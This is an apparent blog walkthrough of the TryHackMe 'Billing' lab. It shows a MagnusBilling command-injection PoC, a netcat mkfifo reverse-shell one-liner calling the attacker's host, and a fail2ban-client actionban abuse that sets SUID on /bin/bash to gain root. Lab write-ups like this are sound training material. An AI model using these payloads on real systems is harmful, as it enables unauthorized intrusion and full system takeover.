---
layout: post
title: "THM-Billing"
description: "Walkthrough of Tryhackme easy billing box"
---

<p>In THM-Billing, we exploited a MagnusBilling command injection, crafted a reverse shell, abused fail2ban to escalate privileges, added SUID to bash, and gained root access.</p>

<h2>Introduction</h2>

<p>In this post, I will demonstrate the exploitation of an easy machine called "Billing" on Tryhackme. Overall, it was an easy but fun box. Excellent for beginners like myself.</p>

<h2> Step 1: running an Nmap scan on the target</h2>

<p>As always, we start with an Nmap scan on the target. I like to use the options -sC and -sV to run some Nmap scripts and do service detection, respectively. This allows us to capture a lot of information as a starting point.</p>
<p>We get the following output:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ nmap -p- -sV -sC 10.10.91.175 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-17 08:12 EDT
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 24.83% done; ETC: 08:12 (0:00:09 remaining)
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 08:12 (0:00:02 remaining)
Nmap scan report for 10.10.91.175
Host is up (0.028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:46:04:3e:ae:a7:82:19:a0:3e:1b:3a:38:d2:5c:7e (ECDSA)
|_  256 44:fe:5b:75:2e:3c:6a:0f:03:8f:84:9c:41:99:a2:ea (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.91.175/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.61 seconds
</pre>
<p>With our Nmap scan, we find an active ssh service as well as a magnusbilling web server  hosted on port 80.</p>

<h2>Step 2: Enumerating the website</h2>
<p>Visiting the website, we are directly redirected to /mbilling and greeted with a login portal. According to the description of the box, we are not allowed to bruteforce our way in. Therefore, I googled whether there are some public exploits available against the magnusbilling service.</p>

<h2>Step 3: Gaining access</h2>
<p>We are in luck as there seems to be some kind of command injection in version 7.3.0:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ searchsploit magnusbilling
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
MagnusSolution magnusbilling 7.3.0 - Command Injection                                                                                                            | multiple/webapps/52170.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

</pre>
<pre>
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/exploitdb/
exploits/             files_exploits.csv    files_shellcodes.csv  shellcodes/           
┌──(kali㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/multiple/webapps/52170.txt                                                                                                                                    
# Exploit Title: MagnusSolution magnusbilling 7.3.0 - Command Injection                                                                                                                             
# Date: 2024-10-26                                                                                                                                                                                  
# Exploit Author: CodeSecLab                                                                                                                                                                        
# Vendor Homepage: https://github.com/magnussolution/magnusbilling7                                                                                                                                 
# Software Link: https://github.com/magnussolution/magnusbilling7                                                                                                                                   
# Version: 7.3.0
# Tested on: Centos
# CVE : CVE-2023-30258


# PoC URL for Command Injection

http://magnusbilling/lib/icepay/icepay.php?democ=testfile; id > /tmp/injected.txt

Result: This PoC attempts to inject the id command.

[Replace Your Domain Name]
</pre>
<p>Unsure about the version we are running, I decided to simply test if the exploit worked. Therefore, I opened burpsuite and crafted an initial test payload that should ping my attacking machine if we have code execution.</p>
<img src="/images/billing/billing_ping_request.webp" alt="burpsuite ping payload request" class="postImage">
<p></p>
<img src="/images/billing/billing_ping_response.webp" alt="burpsuite ping payload response" class="postImage">
<pre>
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
07:43:38.197100 IP 10.9.235.177.49368 > 10.10.109.160.http: Flags [S], seq 3298687438, win 64240, options [mss 1460,sackOK,TS val 2069194663 ecr 0,nop,wscale 7], length 0
07:43:38.224464 IP 10.10.109.160.http > 10.9.235.177.49368: Flags [S.], seq 4199805466, ack 3298687439, win 62643, options [mss 1288,sackOK,TS val 3239529642 ecr 2069194663,nop,wscale 7], length 0
07:43:38.224503 IP 10.9.235.177.49368 > 10.10.109.160.http: Flags [.], ack 1, win 502, options [nop,nop,TS val 2069194690 ecr 3239529642], length 0
</pre>
<p>Bingo, it seems our ping requests are hitting our machine meaning we have code execution!</p>
<p>Next, I tried crafting a reverse shell payload. After many failed attempts, I finally managed to get one working:</p>
<pre>
 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f;
</pre>
<p> Url-encoded in burpsuite, it looks like this:</p>
<img src="/images/billing/billing_reverse_shell_payload (1).webp" alt="burpsuite reverse shell payload" class="postImage">
<p>Starting our listener, we get a shell!</p>

<h2>Step 4: Escalating privileges to root</h2>

<p>After upgrading our shell, we run the sudo -l command and see that we can run the following as sudo:</p>
<pre>
asterisk@ip-10-10-109-160:/var/www/html/mbilling/lib/icepay$ sudo -l
Matching Defaults entries for asterisk on ip-10-10-109-160:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-10-109-160:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
</pre>

<p>After doing some basic research, it seems that fail2ban is an application that protects servers from bruteforce attacks. It bans IP adresses after too many failed attempts.</p>
<p>Delving deeper into the program, it seems that it works with so-called jails which monitor certain services like ssh. It works using a jail.conf file located in the /etc directory. Such a file could for example look like this:</p>
<pre>
[sshd] --> the ssh jail 
enabled = true
port    = ssh
filter  = sshd
logpath = /var/log/auth.log
maxretry = 5 --> banned after 5 login attempts
bantime = 600
</pre>
<p>On the victim machine, we can list the active jails by running this command:</p>
<pre>
asterisk@ip-10-10-109-160:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client status
Status
|- Number of jail:      8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
</pre>
<p>There are 8 jails listed including sshd. After some googling, it seems there is a way to elevate privileges.in /etc/fail2ban/action.d, there a bunch of configuration files. Of these files, the iptables-multiport.conf is the most interesting as it contains the "actionban" parameter which is able to execute system command (it basically tells which command to execute  when an ip has more login attempts than the max allowed attempts). Unfortunately, we did not have write privileges to these files. Examining the help page of the fail2ban-client, it seemed that we could modify the actionban parameter through this client:</p>
<pre>
set &lt;JAIL&gt; action &lt;ACT&gt; actionban &lt;CMD&gt;  sets the ban command &lt;CMD&gt; of the action &lt;ACT&gt; for &lt;JAIL&gt;
</pre>
<p>Knowing this, I crafted a payload which should add suid permissions to the /bin/bash binary as follows:</p>
<pre>
asterisk@ip-10-10-109-160:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport  actionban "chmod +s /bin/bash" chmod +s /bin/bash
</pre>
<p>For this to execute, we need to make sure a ban happens. Therefore, I banned localhost from ssh using the following command:</p>
<pre>
asterisk@ip-10-10-109-160:/var/www/html/mbilling/lib/icepay$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
</pre>
<p>As we can see, it successfully executed as the /bin/bash binary has the suid permission set (in case you did not know, suid allows the file to be executed as its owner (here root)):</p>
<pre>
asterisk@ip-10-10-109-160:/var/www/html/mbilling/lib/icepay$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1265648 Apr 18 13:47 /bin/bash
</pre>
<p>To gain a root shell, run:</p>
<pre>
asterisk@ip-10-10-109-160:/var/www/html/mbilling/lib/icepay$ /bin/bash -p
bash-5.2# whoami
root
bash-5.2# ls /root
filename  passwordMysql.log  root.txt
</pre>
<p>Congratulations, you have successfully rooted this box!</p>
<h2>Final thoughts</h2>
<p>In general, this was a fun and easy box! It was also my first Tryhackme box. The most difficult part of the box was the privilege escalation as I needed to do quite some research before finding how to gain a root shell using fail2ban.</p>
<a href="/">Go to the Home Page</a>